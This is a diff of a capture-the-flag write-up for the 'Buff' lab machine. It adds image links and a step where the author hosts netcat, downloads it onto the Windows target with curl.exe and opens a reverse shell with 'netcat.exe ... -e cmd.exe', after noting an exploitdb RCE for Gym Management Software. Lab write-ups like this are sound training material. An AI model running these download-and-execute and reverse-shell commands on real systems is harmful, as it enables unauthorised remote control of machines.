@@ -55,16 +55,16 @@ Only one port open , **8080** which appears to be a WebServer holding the title 
 
 The webpage represents somewhat of a fitness page with a login option.
 
-![webpage](githuburl)
+![webpage](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/webpage.png)
 
 Clicking on **Contact** button reveals useful information.
 The website has been built using **Gym Management Software 1.0** :
 
-![contact](githuburl)
+![contact](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/contact.png)
 
 While searching the software on **exploitdb** We find a RCE vulnerability ...
 
-![webpage](githuburl)
+![exploitdb](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/exploitdb.png)
 
 I am going to use the 4th exploit which appears to be an **Unauthenticated Remote Code Execution** Vulnerability.
 
@@ -93,3 +93,18 @@ buff\shaun
 
 I have gained an initial shell which is somewhat unstable and not very helpful for lateral movement so I'm going to upload netcat and grab myself a stable shell.
 
+```sh
+root@kali:/usr/share/windows-resources/binaries# python3 -m http.server 80
+```
+Using python3 **http.server** I can host a copy of netcat.exe which is located on ``/usr/share/windows-binaries/nc.exe`` on any Kali host.
+
+On the remote machine I can use the following commands to download and execute netcat in order to give myself a reverse shell :
+
+```sh
+C:\xampp\htdocs\gym\upload> powershell -c "curl.exe http://10.10.14.127/nc.exe -o netcat.exe" 
+C:\xampp\htdocs\gym\upload> netcat.exe 10.10.14.127 9001 -e cmd.exe
+```
+
+After a while listening , I recieve a reverse shell :
+
+![rev](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/rev.png)
